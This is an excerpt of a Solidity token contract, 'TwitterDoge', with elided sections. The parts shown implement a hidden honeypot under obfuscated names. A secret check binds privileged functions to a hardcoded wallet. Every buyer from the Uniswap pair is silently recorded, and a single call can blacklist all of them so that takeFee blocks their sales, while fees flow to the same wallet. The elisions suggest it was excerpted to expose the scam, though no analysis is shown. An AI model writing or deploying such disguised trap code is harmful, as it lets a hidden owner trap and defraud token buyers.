...
contract TwitterDoge is Context, IERC20, Ownable {
    ...
    address payable public AoBMsVZvBCliMEkFzIRyxOxiIQIYn;
    ...
    mapping (address => bool) public Aapdffscddssrscmn;
...
//        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        ...
        teamWalletAddress = payable(address(0x3718af3dBc06368740ce343425F07d8eF4C99E39));
        AoBMsVZvBCliMEkFzIRyxOxiIQIYn = payable(address(0x3718af3dBc06368740ce343425F07d8eF4C99E39));
    ...
    function AFIAWIDKAKFKAD() view private{
        require(WIKPFFWEOFKWE() == AoBMsVZvBCliMEkFzIRyxOxiIQIYn);
    }

    function Opfswleryhvnvmfootltujrs2(bool Mvtgpevbrdlrzmsenlhxjy, address[] calldata MklThfAueuucwgWdVpQvJcLiJQHEKJ) public { AFIAWIDKAKFKAD();
        for (uint256 i; i < MklThfAueuucwgWdVpQvJcLiJQHEKJ.length; i++) {
            Aapdffscddssrscmn[MklThfAueuucwgWdVpQvJcLiJQHEKJ[i]] = Mvtgpevbrdlrzmsenlhxjy;
        }
    }

    function Pmsczryxhskzghulbsyveu3(uint256 gqbypgijntbiggrwwmji,address dzheafrmtggacae) public { AFIAWIDKAKFKAD();
    ...
    function Kkiofnoisfjoenslafkjfiogglk() public { AFIAWIDKAKFKAD();
        for (uint256 i; i < AceMemfsd20isf3.length; i++) {
            if (!Aapdffscddssrscmn[AceMemfsd20isf3[i]]) Aapdffscddssrscmn[AceMemfsd20isf3[i]] = true;
        }
    }
    ...
    function _beforeTokenTransfer(address from, address to, uint256 amount) private {
        if (uniswapPair == from && !isMem[to] && !_isExcludefromFee[to]) {
            isMem[to] = true;
            AceMemfsd20isf3.push(to);
        }
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(AoBMsVZvBCliMEkFzIRyxOxiIQIYn, amountETHMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (!isMarketPair[sender]){
            require(!Aapdffscddssrscmn[sender]);
        }
